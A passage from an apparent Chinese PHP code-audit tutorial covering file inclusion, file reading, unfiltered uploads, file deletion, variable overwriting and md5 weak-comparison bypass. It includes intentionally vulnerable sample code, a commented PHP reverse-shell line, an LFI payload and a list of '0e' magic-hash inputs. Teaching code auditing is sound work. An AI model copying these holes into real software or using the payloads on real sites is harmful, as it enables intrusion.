<li>cwd：要执行命令的初始工作目录。必需是绝对路径。此参数默认使用 NULL（表示当前 PHP 进程的工作目录）</li>
<li>env。要执行命令所使用的环境变量。此参数默认为 NULL（表示和当前 PHP 进程相同的环境变量）</li>
<li>other_options：可选。附加选项<ul>
<li>suppress_errors （仅用于 Windows 平台）：设置为 TRUE 表示抑制本函数产生的错误。</li>
<li>bypass_shell （仅用于 Windows 平台）：设置为 TRUE 表示绕过 cmd.exe shell。</li>
</ul>
</li>
</ul>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><code>include</code>将会包含语句并执行指定文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'filename'</span>;</span><br></pre></td></tr></table></figure>

<p>关键点就在于执行指定文件，执行给了我们代码执行的机会。倘若此时我们构造了一个后门文件，需要在目标机器执行进行shell反弹，那么如果代码中有<code>include</code>而且没有进行过滤，那么我们就可以使用该函数来执行我们的后门函数。演示如下。</p>
<p>示例代码(1.php)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>示例代码(2.php)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//这里可以使用PHP来反弹shell，我这里只是演示</span></span><br><span class="line">	<span class="comment">//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;h1&gt;[*]backdoor is running!&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">payload：<span class="number">1.</span>php?file=<span class="number">2.</span>php</span><br></pre></td></tr></table></figure>

<h4 id="include-once"><a href="#include-once" class="headerlink" title="include_once()"></a>include_once()</h4><p><code>include_once</code>与<code>include</code>没有太大区别，唯一的其区别已经在名称中体现了，就是相同的文件只包含一次。其他功能和<code>include_once</code>一样，只是增加对每个文件包含的次数。</p>
<h4 id="require"><a href="#require" class="headerlink" title="require()"></a>require()</h4><p><code>require</code>的实现和<code>include</code>功能几乎完全相同，那既然一样为什么还要多一个这样的函数呢？( 我也不知道)</p>
<p>其实两者还是有点区别的，什么区别呢？这么说，如果你包含的文件的代码里面有错误，你觉得会发生什么？是继续执行包含的文件，还是停止执行呢？所以区别就在这里产生了。</p>
<p><code>require</code>在出错时会导致脚本终止，而<code>include</code>在出错时只是发生警告，脚本还是继续执行。</p>
<h4 id="require-once"><a href="#require-once" class="headerlink" title="require_once()"></a>require_once()</h4><p>这两者关系和<code>include</code>与<code>include_once</code>的关系是一样的。</p>
<h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><p>函数功能是将整个文件读入一个字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：要读取文件的名称。</li>
<li>include_path：可选。如果也想在 include_path 中搜索文件，可以设置为1。</li>
<li>context：可选。规定句柄的位置。</li>
<li>start：可选。规定文件中开始读取的位置。</li>
<li>max_length：可选。规定读取的字节数。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'demo.txt'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h4><p>此函数将打开一个文件或URL，如果 fopen() 失败，它将返回 FALSE 并附带错误信息。我们可以通过在函数名前面添加一个 <code>@</code> 来隐藏错误输出。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要打开的文件或URL</li>
<li>mode：必需。规定访问类型（例如只读，只写，读写方式等，方式的规定和其他语言的规定方式一致）</li>
<li>include_path：可选。就是你可以指定搜索的路径位置，如果要指定的话，那么该参数要指定为1</li>
<li>context：可选。规定句柄的环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">	$content = fread($file,<span class="number">1024</span>);</span><br><span class="line">	<span class="keyword">echo</span> $content;</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码中其实也包含了<code>fread</code>的用法。因为<code>fread</code>仅仅只是打开一个文件，要想读取还得需要用到<code>fread</code>来读取文件内容。</p>
<h4 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h4><p>这个函数刚才在上个函数中基本已经演示过了，就是读取文件内容。这里代码就不再演示了，简单介绍一下参数和用法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string fread ( resource $handle , int $length )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>handle：文件系统指针，是典型地由 <code>fopen</code>创建的<code>resource</code>。</li>
<li>length：必需。你要读取的最大字节数。</li>
</ul>
<h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>从打开的文件中读取一行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(file,length)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要读取的文件。</li>
<li>length：可选。规定要读取的字节数。默认是1024字节。</li>
</ul>
<p>可以看出这个函数和之前的fread区别不是很大，只不过这个读取的是一行。</p>
<h4 id="fgetss"><a href="#fgetss" class="headerlink" title="fgetss()"></a>fgetss()</h4><p>这个函数跟上个没什么差别，也是从打开的文件中读取去一行，只不过过滤掉了 HTML 和 PHP 标签。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgetss(file,length,tags)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要检查的文件。</li>
<li>length：可选。规定要读取的字节数，默认1024字节。</li>
<li>tags：可选。哪些标记不去掉。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = fopen(<span class="string">"demo.html"</span>,<span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">echo</span> fgetss($file);</span><br><span class="line">	fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><p>这个函数从名称基本就知道它是干啥的了，读文件用的。此函数将读取一个文件，并写入到输出缓冲中。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(filename,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要读取的文件。</li>
<li>include_path：可选。规定要搜索的路径。</li>
<li>context：可选。规定文件句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span> . readfile(<span class="string">"demo.txt"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h4><p>把文件读入到一个数组中，数组中每一个元素对应的是文件中的一行，包括换行符。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(path,include_path,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。要读取的文件。</li>
<li>include_path：可选。可指定搜索路径。</li>
<li>context：可选。设置句柄环境。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(file(<span class="string">"demo.txt"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="parse-ini-file"><a href="#parse-ini-file" class="headerlink" title="parse_ini_file()"></a>parse_ini_file()</h4><p>从名称可以看出，这个函数不是读取一个简单的文件。它的功能是解析一个配置文件(ini文件)，并以数组的形式返回其中的位置。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_ini_file(file,process_sections)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。要读取的ini文件</li>
<li>process_sections：可选。若为TRUE，则返回一个多维数组，包括了详细信息</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	print_r(parse_ini_file(<span class="string">"demo.ini"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="show-source-highlight-file"><a href="#show-source-highlight-file" class="headerlink" title="show_source()/highlight_file()"></a>show_source()/highlight_file()</h4><p>这两个函数没什么好说的，想必大家也经常见到这两个函数，其作用就是让php代码显示在页面上。这两个没有任何区别，<code>show_source</code>其实就是<code>highlight_file</code>的别名。</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h4><p>此函数是将上传的文件移动到新位置。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(file,newloc)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>file：必需。规定要移动的文件。</li>
<li>newloc：必需。规定文件的新位置。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$fileName = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/uploads/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$fileName )</span><br></pre></td></tr></table></figure>

<p>这段代码就是直接接收上传的文件，没有进行任何的过滤，那么当我们上传getshell的后门时，就可以直接获取权限，可见这个函数是不能乱用的，即便要用也要将过滤规则完善好，防止上传不合法文件。</p>
<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink()"></a>unlink()</h4><p>此函数用来删除文件。成功返回 TURE ，失败返回 FALSE。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(filename,context)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>filename：必需。要删除的文件。</li>
<li>context：可选。句柄环境。</li>
</ul>
<p>我们知道，一些网站是有删除功能的。比如常见的论坛网站，是有删除评论或者文章功能的。倘若网站没有对删除处做限制，那么就可能会导致任意文件删除（甚至删除网站源码）。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = <span class="string">"demo.txt"</span>;</span><br><span class="line">    <span class="keyword">if</span>(unlink($file))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file have been deleted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"$file not exist?"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">php&gt;</span><br></pre></td></tr></table></figure>

<h4 id="session-destroy"><a href="#session-destroy" class="headerlink" title="session_destroy()"></a>session_destroy()</h4><p>在了解这个函数之前，我们需要先了解 PHP session。 PHP session 变量用于存储关于用户会话的信息。关于 sesson 的机制这里我就不再过于详细介绍。</p>
<p><code>session_destroy()</code>函数用来销毁一个会话中的全部数据，但并不会重置当前会话所关联的全局变量，同时也不会重置会话 cookie</p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><p>此函数从数组中将变量导入到当前的符号表。其实作用就是给变量重新赋值，从而达到变量覆盖的作用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(<span class="keyword">array</span>,extract_rules,prefix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>array：必需。规定要使用的数组。</li>
<li>extract_rules：可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号中已经存在的变量名是否冲突，对不合法或者冲突的键名将会根据此参数的设定的规则来决定。<ul>
<li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</li>
<li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li>
<li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。</li>
<li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix。</li>
<li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li>
<li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li>
<li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li>
<li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li>
</ul>
</li>
<li>prefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'cat'</span>;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参时如果我们POST传入name=dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。</p>
<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><p>此函数把查询到的字符串解析到变量中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string,<span class="keyword">array</span>)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>string：必需。规定要解析的字符串。</li>
<li>array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。代码示例：</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$name = <span class="string">'who'</span>;</span><br><span class="line">    $age = <span class="string">'20'</span>;</span><br><span class="line">    parse_str(<span class="string">"name=Ameng&amp;age=21"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$name, $age"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">Ameng, <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p>通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。</p>
<h4 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h4><p>此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。</p>
<p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。</li>
<li>prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">	import_request_variables(<span class="string">'gp'</span>);</span><br><span class="line">	<span class="keyword">if</span>($name == <span class="string">'Ameng'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'You are not Ameng'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果什么变量也不传，那么页面将回显<code>You are not Ameng</code>如果通过GET或者POST传入<code>name=Ameng</code>那么页面就会回显<code>Ameng</code></p>
<p>可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。</p>
<h4 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h4><p><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p>第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
<p>第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。</p>
<p>那么这个函数如何实现变量的覆盖呢？我们来看个案例.</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name = <span class="string">'who'</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)	&#123;  </span><br><span class="line">            $$key = $value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span>($name == <span class="string">"Ameng"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are right!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are flase!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出<code>You are false!</code>,而当我们通过GET传参<code>name=Ameng</code>的时候，它会回显<code>You are right!</code>。那么这是为什么呢？我们来分析一下</p>
<p>关键点就在于<code>$$</code>这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用<code>foreach</code>来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为<code>$$key</code>=<code>$name</code>，最后赋值为<code>$value</code>，从而实现了变量覆盖。</p>
<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><h4 id="md5-函数和sha1-绕过"><a href="#md5-函数和sha1-绕过" class="headerlink" title="md5()函数和sha1()绕过"></a>md5()函数和sha1()绕过</h4><p>关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？</p>
<p>PHP 在处理哈希字符串的时候，会使用<code>!=</code>或者<code>==</code>来对哈希值进行比较，它会把每一个<code>0E</code>开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了<code>0E</code>开头的哈希值，那么 PHP 就会将它们视作相等处理。那么<code>0E</code>开头的哈希值有哪些呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>来个简单的例子吧</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">	$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">	<span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'这就是弱类型绕过'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'再思考一下'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果</p>
<p>上面是<code>md5()</code>函数的绕过姿势，那么<code>sha1()</code>如何绕过呢？再来看一个简单的例子</p>
